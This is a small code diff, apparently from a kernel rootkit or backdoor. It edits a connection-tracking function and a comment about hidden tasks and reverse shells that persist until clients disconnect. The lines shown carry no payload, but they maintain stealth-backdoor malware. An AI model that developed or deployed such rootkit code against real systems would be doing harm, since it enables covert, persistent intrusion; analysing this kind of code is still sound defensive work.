@@ -324,12 +324,10 @@ bool kv_bd_established(__be32 *daddr, int dport, bool established) {
              * Make sure to mark established only once per-connection so
              * they will not loose state.
              * This will make internal references to be kept until
-             * connections are closed by clients, when tasks will be unhidden, data
-             * freed and the reverse shell(s) killed.
+             * connections are closed by clients, when tasks are revealed, data
+             * freed and reverse shell(s) killed.
              */
-            if (!node->established) {
-                node->established = established;
-            }
+            node->established = established;
 
             rc = true;
             break;
